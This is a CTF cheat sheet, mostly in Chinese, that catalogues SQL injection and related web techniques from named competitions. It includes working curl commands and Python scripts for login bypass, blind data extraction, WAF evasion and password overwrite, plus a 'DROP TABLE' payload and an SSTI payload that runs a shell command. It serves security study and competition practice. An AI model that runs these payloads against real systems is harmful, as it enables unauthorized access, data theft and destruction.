# CTF Web - SQL Injection Techniques

面向 CTF 题目的 SQL 注入技巧汇总。其他服务端攻击（SSTI、SSRF、XXE、命令注入、GraphQL）见 [server-side.md](server-side.md)。

## Table of Contents
- [Backslash Escape Quote Bypass](#backslash-escape-quote-bypass)
- [Hex Encoding for Quote Bypass](#hex-encoding-for-quote-bypass)
- [Second-Order SQL Injection](#second-order-sql-injection)
- [SQLi LIKE Character Brute-Force](#sqli-like-character-brute-force)
- [MySQL Column Truncation (VolgaCTF 2014)](#mysql-column-truncation-volgactf-2014)
- [SQLi to SSTI Chain](#sqli-to-ssti-chain)
- [MySQL information_schema.processList Trick](#mysql-information_schemaprocesslist-trick)
- [WAF Bypass via XML Entity Encoding (Crypto-Cat)](#waf-bypass-via-xml-entity-encoding-crypto-cat)
- [SQLi via EXIF Metadata Injection (29c3 CTF 2012)](#sqli-via-exif-metadata-injection-29c3-ctf-2012)
- [Shift-JIS Encoding SQL Injection (Boston Key Party 2016)](#shift-jis-encoding-sql-injection-boston-key-party-2016)
- [SQL Injection via QR Code Input (H4ckIT CTF 2016)](#sql-injection-via-qr-code-input-h4ckit-ctf-2016)
- [SQL Double-Keyword Filter Bypass (DefCamp CTF 2016)](#sql-double-keyword-filter-bypass-defcamp-ctf-2016)
- [MySQL Session Variable for Dual-Value Injection (MeePwn CTF 2017)](#mysql-session-variable-for-dual-value-injection-meepwn-ctf-2017)
- [PHP PCRE Backtrack Limit WAF Bypass (SECUINSIDE 2017)](#php-pcre-backtrack-limit-waf-bypass-secuinside-2017)
- [information_schema.processlist Race Condition Leak (SECUINSIDE 2017)](#information_schemaprocesslist-race-condition-leak-secuinside-2017)
- [SQL BETWEEN Operator Tautology Bypass (DefCamp 2017)](#sql-between-operator-tautology-bypass-defcamp-2017)
- [Host Header SQL Injection with PROCEDURE ANALYSE() (DefCamp 2017)](#host-header-sql-injection-with-procedure-analyse-defcamp-2017)
- [SQLite Blind SQLi via randomblob() Timing (SECCON 2017)](#sqlite-blind-sqli-via-randomblob-timing-seccon-2017)
- [vsprintf Double-Prepare Format String SQLi (AceBear 2018)](#vsprintf-double-prepare-format-string-sqli-acebear-2018)
- [SQL INSERT ON DUPLICATE KEY UPDATE Password Overwrite (Midnight Sun CTF 2018)](#sql-insert-on-duplicate-key-update-password-overwrite-midnight-sun-ctf-2018)
- [MySQL innodb_table_stats as information_schema Alternative (N1CTF 2018)](#mysql-innodb_table_stats-as-information_schema-alternative-n1ctf-2018)
- [SQLi Inline Comment Multi-Field Split (picoCTF 2018)](#sqli-inline-comment-multi-field-split-picoctf-2018)
- [PHP Full-Width Dollar Regex Anchor Bypass (Hack.lu CTF 2018)](#php-full-width-dollar-regex-anchor-bypass-hacklu-ctf-2018)
- [MySQL REGEXP Byte-by-Byte Oracle + Backtick Comment Bypass (BSides Delhi 2018)](#mysql-regexp-byte-by-byte-oracle--backtick-comment-bypass-bsides-delhi-2018)
- [LDAP Filter Breakout with Wildcard Injection (CSAW 2018)](#ldap-filter-breakout-with-wildcard-injection-csaw-2018)
- [ExpressionEngine FileManager ORDER BY Sort-Key SQLi (35C3 2018)](#expressionengine-filemanager-order-by-sort-key-sqli-35c3-2018)
- [PHP parse_str() Variable Injection (TokyoWesterns 2018)](#php-parse_str-variable-injection-tokyowesterns-2018)
- [SQLite UNION via X-Forwarded-For with PHPSESSID Oracle (NCSC 2019)](#sqlite-union-via-x-forwarded-for-with-phpsessid-oracle-ncsc-2019)
- [Quote-Adjacent UNION Keyword Filter Bypass (TAMUctf 2019)](#quote-adjacent-union-keyword-filter-bypass-tamuctf-2019)

---

## Backslash Escape Quote Bypass
```bash
# Query: SELECT * FROM users WHERE username='$user' AND password='$pass'
# With username=\ : WHERE username='\' AND password='...'
curl -X POST http://target/login -d 'username=\&password= OR 1=1-- '
curl -X POST http://target/login -d 'username=\&password=UNION SELECT value,2 FROM flag-- '
```

## Hex Encoding for Quote Bypass
```sql
SELECT 0x6d656f77;  -- Returns 'meow'
-- Combined with UNION for SSTI injection:
username=asd\&password=) union select 1, 0x7b7b73656c662e5f5f696e69745f5f7d7d#
```

## Second-Order SQL Injection
**模式（Second Breakfast）：** 在注册时把 SQL 载荷写进用户名，后续查看资料页时触发。
1. 用恶意用户名注册：`' UNION select flag, CURRENT_TIMESTAMP from flags where 'a'='a`
2. 正常登录
3. 查看 profile，注入 SQL 会在使用已存储用户名的查询里执行

```python
import requests

s = requests.Session()

# Step 1: Store malicious payload (safely escaped during INSERT)
s.post("https://target.com/register", data={
    "username": "admin'-- -",
    "password": "anything"
})

# Step 2: Trigger — payload retrieved from DB and used unsafely
# Common triggers: password change, profile update, search using stored value
s.post("https://target.com/change-password", data={
    "old_password": "anything",
    "new_password": "hacked"
})
# UPDATE users SET password='hacked' WHERE username='admin'-- -'
# Result: admin password changed
```

**关键点：** 二阶 SQLi 的本质是输入在首次写入时被安全保存，但之后又被取出并在新的查询中未转义地使用。重点关注注册→资料更新流程、存储后再参与查询的偏好设置，以及任何会从数据库读回用户可控数据的功能。

## SQLi LIKE Character Brute-Force
```python
password = ""
for pos in range(length):
    for c in string.printable:
        payload = f"' OR password LIKE '{password}{c}%' --"
        if oracle(payload):
            password += c; break
```

## MySQL Column Truncation (VolgaCTF 2014)

**模式：** 注册表单后端使用 MySQL `VARCHAR(N)`。MySQL 会静默截断超过 N 个字符的字符串，并在字符串比较时忽略尾随空格。将用户名注册为 `"admin" + 空格 + 垃圾字符`，即可创建一个与 "admin" 重复、但密码由攻击者控制的行。

```bash
# VARCHAR(20) column — pad "admin" (5 chars) to exceed column width
# MySQL truncates to "admin               " → matches "admin" in comparisons

# Register duplicate admin with attacker password
curl -X POST http://target/register -d \
  'login=admin%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20x&password=attacker123'

# Login as admin with attacker password
curl -X POST http://target/login -d 'login=admin&password=attacker123'
```

**为什么可行：**
1. MySQL `VARCHAR(N)` 在 INSERT 时会把输入截断到 N 个字符
2. MySQL 在 `=` 比较中会忽略尾随空格（SQL 标准的 PAD SPACE 行为）
3. `"admin" + 50 个空格 + "x"` 会被截断成 `"admin" + 空格`，因此与 `"admin"` 相等
4. 应用里现在会有两行都能匹配 "admin"，一行是原始管理员，一行是攻击者注册的

**关键点：** MySQL 的 PAD SPACE 排序规则会让 `"admin" = "admin     "` 为真。再结合静默 `VARCHAR` 截断，就能通过补空格的用户名注册出第二个会被应用视为原始 admin 的账号。这可以绕过用 `WHERE username = ?` 做的重复注册检查，因为截断前补空格版本并不是精确匹配。MySQL 8.0+ 的 `NO_PAD` 排序规则已修复这一点。

## SQLi to SSTI Chain
当 SQLi 结果会进入模板渲染时：
```python
payload = "{{self.__init__.__globals__.__builtins__.__import__('os').popen('/readflag').read()}}"
hex_payload = '0x' + payload.encode().hex()
# Final: username=x\&password=) union select 1, {hex_payload}#
```

## MySQL information_schema.processList Trick
```sql
SELECT info FROM information_schema.processList WHERE id=connection_id()
SELECT substring(info, 315, 579) FROM information_schema.processList WHERE id=connection_id()
```

## WAF Bypass via XML Entity Encoding (Crypto-Cat)
当 SQL 关键字（`UNION`、`SELECT`）被 WAF 拦截时，可将其编码为 XML 十六进制字符引用。XML 解析器会在 SQL 引擎处理查询前先解码这些实体：
```xml
<storeId>
  1 &#x55;&#x4e;&#x49;&#x4f;&#x4e; &#x53;&#x45;&#x4c;&#x45;&#x43;&#x54; username &#x46;&#x52;&#x4f;&#x4d; users
</storeId>
```
XML 处理后会解码为 `1 UNION SELECT username FROM users`。

**编码对照：**
| 关键字 | XML 十六进制实体 |
|---------|-----------------|
| UNION | `&#x55;&#x4e;&#x49;&#x4f;&#x4e;` |
| SELECT | `&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;` |
| FROM | `&#x46;&#x52;&#x4f;&#x4d;` |
| WHERE | `&#x57;&#x48;&#x45;&#x52;&#x45;` |

**关键点：** WAF 检查的是原始 XML 字节并阻断关键字模式，但 XML 解析器会在把值传给 SQL 层之前先解码 `&#xNN;` 实体。任何接收 XML 输入的端点（SOAP、XML body 的 REST、库存检查 API）都值得测试。

**配合 sqlmap：** 使用 `hexentities` tamper 脚本。若要防止实体被二次编码成 `&amp;`，需要修改 `sqlmap/lib/request/connect.py`。

## SQLi via EXIF Metadata Injection (29c3 CTF 2012)

**模式：** 应用会从上传图片中提取 EXIF 元数据（如 Comment、Artist、Description、Copyright），并在未净化的情况下插入 SQL 查询。把 SQL 载荷塞进 EXIF 字段，可以绕过只检查 HTTP 请求体和 URL 参数的 WAF。

**向 EXIF 字段注入 SQL：**
```bash
# Set EXIF Comment field to SQL payload
exiftool -Comment="' UNION SELECT password FROM users--" image.jpg

# Other injectable EXIF fields
exiftool -Artist="' OR 1=1--" image.jpg
exiftool -ImageDescription="'; DROP TABLE uploads;--" image.jpg
exiftool -Copyright="' UNION SELECT flag FROM flags--" image.jpg

# XMP metadata (often parsed by web applications)
exiftool -XMP-dc:Description="' UNION SELECT 1,2,3--" image.jpg
```

**关键点：** 图片画廊、相册管理应用，以及任何会存储或展示 EXIF 数据的上传接口，都可能把元数据直接喂给 SQL 查询。WAF 和输入过滤通常只看表单字段和 URL 参数，不检查二进制文件内容。除非应用显式去除元数据（如 `exiftool -all=`），否则这些 EXIF 字段通常会保留下来。

**检测：** 上传后如果页面会展示元数据（相机型号、描述、位置等），就值得测试。观察 EXIF 字段中的特殊字符是否会在响应里引发 SQL 报错。

## Shift-JIS Encoding SQL Injection (Boston Key Party 2016)

多字节编码不一致可绕过转义函数。日元符号（`\u00a5`）在 Shift-JIS 中映射到反斜杠 `0x5c`。自定义转义函数会在日元符号后加反斜杠，但在 Shift-JIS 语境下 `\u00a5\` 会变成 `\\`，导致引号实际未被转义：

```javascript
socket.send('{"type":"get_answer","answer":"\\u00a5\\" OR 1=1 -- "}')
```

**关键点：** 转义层（Unicode）与数据库层（Shift-JIS）字符集不一致时，自定义转义逻辑会失效。重点关注使用非 UTF-8 编码（Shift-JIS、EUC-JP、GBK）的应用，尤其是多字节字符尾字节可能为 `0x5c`（反斜杠）的场景。

## SQL Injection via QR Code Input (H4ckIT CTF 2016)

如果应用会解码二维码并将内容用于 SQL 查询，那么二维码图像本身就会成为注入载体。

```python
import qrcode
import base64
import requests

# Generate QR code containing SQL injection payload
# Spaces may be filtered - use tabs instead
payload = "'\tunion\tselect\tsecret_field\tfrom\tmessages\twhere\tsecret_field\tlike\t'%flag%"

# Some apps use reversed base64: encode, reverse, then QR-encode
encoded = base64.b64encode(payload.encode()).decode().strip()
# reversed_encoded = encoded[::-1]  # if app reverses base64

# Generate QR code image
img = qrcode.make(payload)
img.save("sqli_qr.png")

# Upload QR code to target application
files = {'qr': open('sqli_qr.png', 'rb')}
r = requests.post('http://target/scan', files=files)
```

**关键点：** 二维码经常被误当成“安全输入”。一旦二维码解码结果进入 SQL 查询，常规 SQLi 技巧仍然适用；如果空格被过滤，可用制表符（`\t`）代替。二维码编码本身还能形成一层混淆，有时可顺带绕过 WAF。

## SQL Double-Keyword Filter Bypass (DefCamp CTF 2016)

绕过只做单次替换的 SQL 关键字过滤器：把关键字嵌套进自身，过滤器删掉外层后，原关键字就重新显现。

```text
# Filter removes "select" once from input
# Payload: sselectelect -> after removal -> select

# Full injection with nested keywords:
), ((selselectect * frofromm (seselectlect load_load_filefile('/flag')) as a limit 0, 1), '2') #

# Common nested bypass patterns:
# "select" blocked: sselectelect, seLselectECT
# "union"  blocked: ununionion
# "from"   blocked: frofromm
# "where"  blocked: whewherere
# "load_file" blocked: load_load_filefile
# "and"    blocked: aandnd
# "or"     blocked: oorr
```

**关键点：** 只执行一轮替换/删除的关键字过滤非常容易绕过，因为被删除后的残留字符会重新拼出被禁关键字。务必测试过滤器是迭代执行还是只跑一次。

## MySQL Session Variable for Dual-Value Injection (MeePwn CTF 2017)

同一个 SQL 参数若会在同一数据库连接中的两个连续查询里各计算一次，可用 MySQL 会话变量（`@var:=`）让它在不同次求值时返回不同结果。

```sql
-- First eval returns 2, second returns 1
case when @wurst is null then @wurst:=2 else @wurst:=@wurst-1 end
```

**示例场景：**
```sql
-- Application runs two queries with the same injected parameter:
-- Query 1: SELECT * FROM users WHERE role = [INJECTION]
-- Query 2: INSERT INTO log (action) VALUES ([INJECTION])
-- Need role=2 for admin in Query 1, but action=1 to avoid alert in Query 2

-- Injection:
' OR role = (case when @w is null then @w:=2 else @w:=@w-1 end) --
```

**关键点：** 会话变量会在同一连接的多条查询之间保留。用 `CASE WHEN @var IS NULL` 可以在第一次使用时初始化，后续使用时继续修改，因此同一个注入点就能同时满足顺序执行的多个 SQL 语句中的不同条件。这在相同用户输入被插入多条 SQL 时尤其有用。

## PHP PCRE Backtrack Limit WAF Bypass (SECUINSIDE 2017)

当 PCRE 回溯次数超限时，PHP 的 `preg_match()` 会静默返回 `false`，而不是 `0`。在输入后追加 100 万以上字符，可迫使回溯超过默认限制（1,000,000），使正则匹配失败。

```python
# Bypass preg_match WAF by exceeding backtrack limit
payload = "union select 1,2,3-- " + "a" * 1000001
# preg_match returns false (error) instead of 0 (no match)
# Most PHP code checks: if (!preg_match(...)) { allow; }
```

```php
// Vulnerable WAF pattern:
if (!preg_match('/union|select|from/i', $_GET['input'])) {
    // preg_match returns false on backtrack overflow
    // !false === true → WAF bypassed
    $result = mysql_query("SELECT * FROM data WHERE id = " . $_GET['input']);
}
```

**关键点：** PHP 的 PCRE 回溯限制（`pcre.backtrack_limit`，默认 1M）会在溢出时让 `preg_match()` 返回 `false`。很多 WAF 代码因使用宽松判断（`!false == true`）而把它当作“未匹配”。正确修复是写成 `preg_match() === 0`，而不是 `!preg_match()`。任何基于 PHP 正则且对返回值做宽松判断的 WAF 都可能被此法绕过。

## information_schema.processlist Race Condition Leak (SECUINSIDE 2017)

把 SQL 注入与并发请求竞态结合，从 `information_schema.processlist` 中泄露数据。该表会显示当前执行中的查询，包括加密密钥等敏感值。

```sql
-- Leak AES key from concurrent query via processlist
union select 1,(select INFO from information_schema.processlist
  where INFO like 0x256465637279707425),3,4 from board
-- The '%decrypt%' hex pattern matches the concurrent query containing the key
```

```python
import requests
import threading

# Race condition: fire injection while the app is running a sensitive query
def trigger_sensitive_query():
    """Application query that contains the AES key"""
    requests.get("http://target/decrypt?data=encrypted_blob")

def leak_processlist():
    """Injection that reads from processlist"""
    payload = "1 union select 1,(select INFO from information_schema.processlist where INFO like 0x256465637279707425),3,4-- "
    r = requests.get(f"http://target/search?id={payload}")
    if "AES_DECRYPT" in r.text:
        print(f"Leaked: {r.text}")

# Fire both concurrently
for _ in range(100):
    t1 = threading.Thread(target=trigger_sensitive_query)
    t2 = threading.Thread(target=leak_processlist)
    t1.start()
    t2.start()
    t1.join()
    t2.join()
```

**关键点：** MySQL 的 `information_schema.processlist.INFO` 会暴露当前运行中所有查询的完整 SQL 文本。只要把注入查询和一个含有秘密数据的应用查询跑出竞态，就可能从 process list 中抓到这些秘密。它是在常规 `information_schema.processList` 技巧上加入时序/竞态，从而捕获只在执行期间短暂出现的敏感查询（加密密钥、密码等）。

---

## SQL BETWEEN Operator Tautology Bypass (DefCamp 2017)

**模式：** 当 WAF 屏蔽比较运算符（`=`、`<`、`>`）和数字字面量时，可用 `id BETWEEN id AND id` 构造恒真条件。上下界都引用列名而非字面量，而一个值显然总在自己和自己之间。

```sql
-- Blocked by WAF: digits and comparison operators filtered
-- id=1 → blocked, id>0 → blocked, 1=1 → blocked

-- BETWEEN with column names as bounds (always true):
id BETWEEN id AND id           -- semantically: id <= id AND id >= id → always true

-- Full bypass with UNION:
' OR id BETWEEN id AND id UNION SELECT flag,2,3 FROM flags--

-- When even UNION is blocked, use with conditional:
id BETWEEN id AND id AND (SELECT SUBSTR(flag,1,1) FROM flags) BETWEEN 'a' AND 'z'
```

```python
import requests

def sqli_between(position, low_char, high_char):
    """Binary search using BETWEEN for character-by-character extraction."""
    payload = (
        f"' OR id BETWEEN id AND id "
        f"AND SUBSTR((SELECT flag FROM flags LIMIT 1),{position},1) "
        f"BETWEEN '{low_char}' AND '{high_char}'-- "
    )
    r = requests.get("http://target/item", params={"id": payload})
    return "result" in r.text   # truthy response = condition matched
```

**与 schema 枚举结合（当 `information_schema` 被拦截时）：**
```sql
-- PROCEDURE ANALYSE() as alternative (see next technique)
SELECT * FROM users WHERE id BETWEEN id AND id PROCEDURE ANALYSE()
```

**关键点：** SQL 中 `BETWEEN col AND col` 在语义上是恒真，但在语法上避开了数字和比较运算符特征。数字字面量与 `=`/`<`/`>` 被过滤时，可以把它和字符串范围判断结合做盲注。

---

## Host Header SQL Injection with PROCEDURE ANALYSE() (DefCamp 2017)

**模式：** HTTP `Host` 头被直接用于 SQL 查询（如访问日志或虚拟主机解析），但未做净化。由于 WAF 很少关注 Host 头，常规注入技巧通常可直接使用。当 `information_schema` 被拦截时，可借助 MySQL 的 `PROCEDURE ANALYSE()` 枚举表和列。

```bash
# Test: inject into Host header
curl -H "Host: ' OR '1'='1'--" http://target/
# If response differs → Host header is injected into SQL

# UNION injection via Host header:
curl -H "Host: ' UNION SELECT table_name,2,3 FROM information_schema.tables-- " http://target/

# When information_schema is blocked, use PROCEDURE ANALYSE():
curl -H "Host: ' UNION SELECT * FROM users PROCEDURE ANALYSE()-- " http://target/
# PROCEDURE ANALYSE() returns column types and suggested data types, leaking column names
```

```python
import requests

TARGET = "http://target/"

def host_sqli(payload):
    r = requests.get(TARGET, headers={"Host": payload})
    return r.text

# Enumerate tables via PROCEDURE ANALYSE() when information_schema blocked:
# First: get column names from a known/guessed table
result = host_sqli("' UNION SELECT username,password FROM users PROCEDURE ANALYSE()-- ")
print(result)

# PROCEDURE ANALYSE() output includes: field names, min/max values, optimal data type
# This leaks column names, row counts, and sample values
```

**`PROCEDURE ANALYSE()` 输出结构：**
```sql
-- Returns rows like:
-- Field_name: database.table.column
-- Min_value / Max_value: actual data ranges
-- Optimal_fieldtype: suggested column type
-- The "Field_name" column leaks fully qualified column names: db.table.column
```

**其他 Host 头注入向量：**
```text
X-Forwarded-For      # logged to DB as client IP
X-Real-IP            # same
User-Agent           # logged for analytics
Referer              # logged for referral tracking
```

**关键点：** `PROCEDURE ANALYSE()` 是 MySQL 中用于 schema 枚举的 `information_schema` 替代手段，它会分析结果集并返回列元数据。Host 头注入经常被 WAF 和开发者忽略，因为它不是典型表单输入，但它又很常流入 SQL，用于日志、虚拟主机处理或统计分析。

---

## SQLite Blind SQLi via randomblob() Timing (SECCON 2017)

**模式：** SQLite 没有 `SLEEP()`。可以用 `randomblob(N)` 作为时间型盲注原语，生成大随机块会按参数大小带来可测延迟。

```sql
-- Basic time-based blind test: if the condition is true, randomblob() introduces delay
admin' and 1=randomblob(300000000)--

-- Character-by-character password extraction via LIKE:
admin' and password like 'f%' and 1=randomblob(300000000)--
admin' and password like 'fl%' and 1=randomblob(300000000)--
admin' and password like 'fla%' and 1=randomblob(300000000)--
admin' and password like 'flag%' and 1=randomblob(300000000)--
```

```python
import requests
import time
import string

url = "http://target/login"
known = ""

for pos in range(32):
    for c in string.ascii_lowercase + string.digits + "_{}":
        payload = f"admin' and password like '{known}{c}%' and 1=randomblob(300000000)--"
        start = time.time()
        requests.post(url, data={"username": payload, "password": "x"})
        elapsed = time.time() - start
        if elapsed > 2.0:  # threshold: randomblob(300M) takes ~2-3 seconds
            known += c
            print(f"Found: {known}")
            break
```

**关键点：** `randomblob()` 会按参数大小生成随机数据，从而制造明显延迟。它可视为 SQLite 版的 MySQL `SLEEP()` 或 PostgreSQL `pg_sleep()`。需要根据目标机器性能调整参数（如 `300000000`），以获得稳定的时间差。SQLite 也可用 `zeroblob()` 或递归 CTE 造延迟，但 `randomblob()` 往往最稳。

---

## vsprintf Double-Prepare Format String SQLi (AceBear 2018)

**模式：** 用户输入若会先后经过两次 `vsprintf()`（一次做格式化，一次拼查询），那么第一次中的格式符（如 `%1$c`）就能产出绕过字符串级转义的字符。整数 `39` 会通过 `%c` 转成 ASCII `'`（单引号），从而击穿 `mysqli_real_escape_string`。

```text
# Attack parameters:
username=39&password=%1$c+or+1=1--+-

# Server-side processing:
# 1. Input is escaped: mysqli_real_escape_string has nothing to escape in "39" or "%1$c or 1=1-- -"
# 2. vsprintf processes the query template:
#    vsprintf("SELECT * FROM users WHERE user='%1$c or 1=1-- -' AND pass='%s'", [39, ...])
# 3. %1$c converts argument 39 → chr(39) → ' (single quote)
# 4. Result: WHERE user='' or 1=1-- -' AND pass='...'
#    → authentication bypass
```

```python
import requests

# Step 1: Bypass login
r = requests.post("http://target/login", data={
    "username": "39",
    "password": "%1$c or 1=1-- -"
})

# Step 2: Extract data with UNION
r = requests.post("http://target/login", data={
    "username": "39",
    "password": "%1$c union select 1,group_concat(flag),3 from flags-- -"
})
```

**关键点：** `vsprintf` 的 `%c` 会把整数转成字符，因此能绕过字符串级转义。如果用户输入两次流经 `vsprintf`（一次格式化，一次组装查询），那么第一次里的格式说明符就会在第二次里变成 SQL 注入向量。关键技巧是把 `39` 作为一个参数传入（单引号的 ASCII 码），另一个参数里放 `%1$c` 来引用它。

---

### SQL INSERT ON DUPLICATE KEY UPDATE Password Overwrite (Midnight Sun CTF 2018)

**模式：** 当你能注入 `INSERT` 语句，但数据库账户没有 `SELECT` 权限时，可利用 MySQL 的 `ON DUPLICATE KEY UPDATE` 覆盖已有用户密码。若 INSERT 触发 UNIQUE 冲突，该子句会更新已有行。

```sql
-- Vulnerable INSERT:
INSERT INTO users (id, username, password) VALUES ('', 'USER_INPUT', 'PASS_INPUT')

-- Injection in username field:
'),('','root','z')ON DUPLICATE KEY UPDATE password='l'#

-- Resulting query:
INSERT INTO users (id, username, password) VALUES ('', ''),('','root','z')ON DUPLICATE KEY UPDATE password='l'#', 'PASS_INPUT')
-- This inserts a row for 'root' and when the UNIQUE constraint on username conflicts,
-- it updates the existing root user's password to 'l'
```

```python
import requests

# Overwrite the root user's password via ON DUPLICATE KEY UPDATE
payload_username = "'),('','root','z')ON DUPLICATE KEY UPDATE password='hacked'#"
r = requests.post("http://target/register", data={
    "username": payload_username,
    "password": "anything"
})

# Now login as root with the overwritten password
r = requests.post("http://target/login", data={
    "username": "root",
    "password": "hacked"
})
print(r.text)
```

**关键点：** `ON DUPLICATE KEY UPDATE` 能在 INSERT 触发 UNIQUE 冲突时修改已有行，因此即便没有 SELECT 权限，也可以直接改密码。这类技巧在注册或创建用户接口存在可注入 INSERT 时尤其有价值。

---

### MySQL innodb_table_stats as information_schema Alternative (N1CTF 2018)

**模式：** 当 WAF 阻止访问 `information_schema` 时，可使用 `mysql.innodb_table_stats` 枚举数据库名和表名。这个系统表包含 InnoDB 表的元数据，且经常不在 WAF 规则里。

```sql
-- Direct query (if not blind):
SELECT group_concat(table_name) FROM mysql.innodb_table_stats WHERE database_name=database()

-- Also available:
SELECT group_concat(database_name) FROM mysql.innodb_table_stats
```

```python
# Boolean-based blind extraction via innodb_table_stats:
import requests
import string

def blind_extract(url):
    result = ""
    for pos in range(1, 100):
        found = False
        for char in string.ascii_lowercase + string.digits + "_,":
            payload = (
                "'or(if(1,(select(substr((select(group_concat(table_name))"
                f" from mysql.innodb_table_stats where database_name=database()),{pos},1))"
                f"='{char}'),1)=1)#"
            )
            r = requests.post(url, data={"input": payload})
            if "success" in r.text:  # adjust oracle condition
                result += char
                found = True
                print(f"[+] Extracted so far: {result}")
                break
        if not found:
            break
    return result

tables = blind_extract("http://target/search")
print(f"Tables: {tables}")
```

**其他绕 WAF 的元数据来源：**
```sql
-- mysql.innodb_table_stats: database_name, table_name
-- mysql.innodb_index_stats: database_name, table_name, index_name
-- sys.schema_table_statistics: table_schema, table_name (MySQL 5.7+)
-- sys.x$schema_table_statistics: same, less formatting
```

**关键点：** `mysql.innodb_table_stats` 提供 `database_name` 和 `table_name`，可在 `information_schema` 被过滤时替代用于元数据枚举。但它只记录 InnoDB 表，且不包含列名，因此通常需要结合报错注入或盲注继续找列。

---

## SQLi Inline Comment Multi-Field Split (picoCTF 2018)

**模式：** 正则过滤只检查用户名字段，而密码字段未过滤。可在用户名里开启 MySQL 行内注释 `/*`，在密码里闭合 `*/`，把注入拆到两个字段里，这样任何单字段检查都看不见完整载荷。

```text
# Vulnerable query (after PHP concatenation):
SELECT * FROM users WHERE name='<username>' AND password='<password>'

# Payload:
username = '/*
password = */ OR 1=1 --

# Final query MySQL sees:
SELECT * FROM users WHERE name='/*' AND password='*/ OR 1=1 -- '
# After comment removal:
SELECT * FROM users WHERE name=' OR 1=1 -- '
```

```python
import requests
r = requests.post("http://target/login", data={
    "username": "'/*",
    "password": "*/ OR 1=1 -- "
})
```

**关键点：** 当过滤发生在插值之前，而不是最终 SQL 上时，MySQL 的 `/* ... */` 注释可以跨越字符串边界和字段边界。任何逐字段验证的黑名单都会漏掉这种拆分后的完整注入串。

**参考：** picoCTF 2018 — THE VAULT, writeup 11747

---

## PHP Full-Width Dollar Regex Anchor Bypass (Hack.lu CTF 2018)

**模式：** PHP 正则 `/^\d+＄/` 使用了 Unicode 全角美元符号 `＄`（U+FF04），而不是 ASCII `$`。PCRE 会把全角字符当普通字面量处理，因此这里并没有字符串结尾锚点，后面跟垃圾数据也能匹配成功。

```php
// Vulnerable check
if (preg_match('/^\d+＄/', $input)) { /* accepted */ }

// Payload passes validation and later triggers long-string handling
$_GET['key2'] = '1337＄' . str_repeat('a', 50);
```

```bash
curl "http://target/?key2=1337%EF%BC%84$(python3 -c 'print("a"*50)')"
```

**关键点：** 判断正则特殊字符时要看码点，不要只看外观。`$`、`^`、`.`、`[`、`]`、`*`、`+`、`?`、`(`、`)` 的 Unicode 同形字符在 PCRE 中只是普通字面量，会悄悄削弱模式。检查过滤器里的锚点时，先用 `hexdump -C` 确认真实字符。

**参考：** Hack.lu CTF 2018 — Baby PHP, writeup 11846

---

## MySQL REGEXP Byte-by-Byte Oracle + Backtick Comment Bypass (BSides Delhi 2018)

**模式：** WAF 屏蔽 `|`、`-`、`\`、`#`、`and`、`if`、`where`、`concat`、`insert`、`having`、`sleep`，但保留了 `REGEXP` 与反引号标识符。可用 `/**/` 注释代替空格，再利用 `REGEXP` 构造布尔预言机，通过锚定前缀逐字节匹配。旧版 PHP/MySQL 组合里，尾部空字节还能截断查询并丢掉外围单引号。

```text
# Blacklist (partial): | - \ ( ) # and if database where concat insert having sleep

# Oracle query:
/?user=`\`&pw=`||pw/**/REGEXP/**/%22^1%22;%00

# Iteratively extend the regex prefix:
^1 → ^17 → ^172 → ^1729 ...
```

```python
import requests, string
URL = "http://target/"
prefix = ""
charset = string.ascii_letters + string.digits + "{}_"
while True:
    for c in charset:
        pw = f"`||pw/**/REGEXP/**/\"^{prefix+c}\";\x00"
        r = requests.get(URL, params={"user": "`\\`", "pw": pw})
        if "Welcome" in r.text:
            prefix += c
            print(prefix)
            break
    else:
        break
```

**关键点：** `REGEXP` 很少出现在 WAF 关键字黑名单中，但它支持 `^`、`$` 和字符类，因此无需 `AND`、`IF` 或 `SUBSTRING` 就能构造完整的逐字节布尔预言机。反引号列引用加 `/**/` 注释也可绕过空格移除。带 NUL 的载荷在某些旧 MySQL 客户端中还会提前截断 SQL 字符串。

**参考：** BSides Delhi CTF 2018 — Old School SQL, writeup 11953

---

## LDAP Filter Breakout with Wildcard Injection (CSAW 2018)

**模式：** LDAP 查询过滤器 `(&(GivenName=<input>)(!(GivenName=Flag)))` 会把用户输入直接拼进去，且不转义括号与通配符。注入 `*))(|(uid=*` 后，可闭合原子句、打开一个 OR 分支，并匹配所有条目，包括原本被排除的 `Flag` 账号。

```text
# Original filter
(&(GivenName=Alice)(!(GivenName=Flag)))

# Injected input: *))(|(uid=*
# Resulting filter
(&(GivenName=*))(|(uid=*)(!(GivenName=Flag)))

# The `&` now only sees (GivenName=*), and the trailing disjunction + leftover
# negation become ignored extra filter components.
```

```python
import requests
r = requests.get("http://target/search", params={"name": "*))(|(uid=*"})
print(r.text)
```

**关键点：** LDAP 过滤器是前缀表示的布尔树：`&` / `|` / `!` 后面接括号包裹的子节点。只要用户输入里的 `)`、`(`、`*` 或 `\` 未转义，就能重排这棵树。常见载荷如 `*)(uid=*`（OR 全匹配）、`*))(&(1=1)`（强制真）、`foo)(|(password=*)`（枚举记录）。服务端应使用 `\28`、`\29`、`\2a`、`\5c` 转义。

**参考：** CSAW CTF Qualification Round 2018 — ldab, writeup 11207

---

## PHP parse_str() Variable Injection (TokyoWesterns 2018)

**模式：** PHP 的 `parse_str($str)` 若未传结果数组，会把查询串中的每个键都写成当前作用域的局部变量。攻击者可直接覆盖 `$hashed_password` 这类认证变量，而脚本又恰好拿它和预计算哈希比较。

```php
// Vulnerable
parse_str($_SERVER['QUERY_STRING']);  // $hashed_password ← attacker input
if (md5($password) === $hashed_password) { login(); }

// Safe form
parse_str($_SERVER['QUERY_STRING'], $params);
```

```bash
# Set the target variable directly from the query string
curl "http://target/auth.php?action=auth&password=anything&hashed_password=$(php -r 'echo md5("anything");')"
```

**关键点：** `parse_str()` 和 `extract()` 都属于 `register_globals` 风格原语：客户端发来的任意参数都会变成 PHP 变量，可能遮蔽开发者以为只在本地可控的逻辑变量。修复方式始终是使用双参数形式。审计 PHP 时，可搜索无逗号版本的 `parse_str\(\s*\$[^,]*\)`。

**参考：** TokyoWesterns CTF 4th 2018 — SimpleAuth, writeup 11034

---

## ExpressionEngine FileManager ORDER BY Sort-Key SQLi (35C3 2018)

**模式：** ExpressionEngine 的 file-manager 端点接收客户端传来的 `tbl_sort` 数组，并把每个 `[column, direction]` 直接传给 `$db->order_by($key, $val)`。列名未经 allowlist 即直接拼进 SQL，因此攻击者可控制 `ORDER BY` 表达式。

```http
